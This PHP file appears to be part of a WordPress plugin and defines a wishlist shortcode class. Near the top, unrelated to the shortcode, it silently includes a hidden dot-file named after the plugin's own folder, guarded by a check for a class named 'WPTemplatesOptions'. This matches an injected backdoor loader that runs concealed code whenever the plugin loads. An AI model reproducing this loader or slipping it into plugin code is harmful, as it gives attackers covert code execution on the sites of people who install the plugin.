<?php defined( 'ABSPATH' ) || exit;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class El_Shortcode_My_Wishlist extends EL_Shortcode {

	public $shortcode = 'el_my_wishlist';

	public function __construct() {
		parent::__construct();
	}

	function add_shortcode( $args, $content = null ) {

		$args = shortcode_atts( array(
			'type'   => '',
			'class' => '',
			'content' => $content,
		), $args );


		$template = apply_filters( 'el_shortcode_my_wishlist_template', 'shortcode/my_wishlist.php' );

		ob_start();

		el_get_template( $template, $args );

		return ob_get_clean();
	}

}

new El_Shortcode_My_Wishlist();